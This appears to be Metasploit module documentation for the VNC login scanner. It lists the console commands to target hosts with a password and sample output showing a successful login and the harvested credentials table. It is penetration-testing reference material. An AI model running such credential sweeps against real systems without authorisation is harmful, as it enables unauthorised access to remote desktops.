## Vulnerable Application

This module will test a VNC server on a range of machines and
report successful logins. Currently it supports RFB protocol
version 3.3, 3.7, 3.8 and 4.001 using the VNC challenge response
authentication method.

## Verification Steps

1. Do: `use auxiliary/scanner/vnc/vnc_login`
2. Do: `set RHOSTS [IP]`
3. Do: `set password [password]`
4. Do: `run`

## Options

## Scenarios

### TigerVNC 1.7.0+dfsg-8ubuntu2 on Ubuntu 18.04

```
msf6 > use auxiliary/scanner/vnc/vnc_login
msf6 auxiliary(scanner/vnc/vnc_login) > set rhosts 111.111.1.222
rhosts => 111.111.1.222
msf6 auxiliary(scanner/vnc/vnc_login) > set rport 5901
rport => 5901
msf6 auxiliary(scanner/vnc/vnc_login) > set password 111122223333
password => 111122223333
msf6 auxiliary(scanner/vnc/vnc_login) > run

[*] 111.111.1.222:5901    - 111.111.1.222:5901 - Starting VNC login sweep
[+] 111.111.1.222:5901    - 111.111.1.222:5901 - Login Successful: :111122223333
[-] 111.111.1.222:5901    - 111.111.1.222:5901 - LOGIN FAILED: :password (Incorrect: Authentication failed: Authentication failed)
[*] 111.111.1.222:5901    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/vnc/vnc_login) >
```

Once the module has finished running one can observe the gathered credentials using the `creds` command:

```
msf6 auxiliary(scanner/vnc/vnc_login) > creds
Credentials
===========

host           origin         service         public  private       realm  private_type  JtR Format
----           ------         -------         ------  -------       -----  ------------  ----------
111.111.1.222  111.111.1.222  5901/tcp (vnc)          111122223333         Password
```
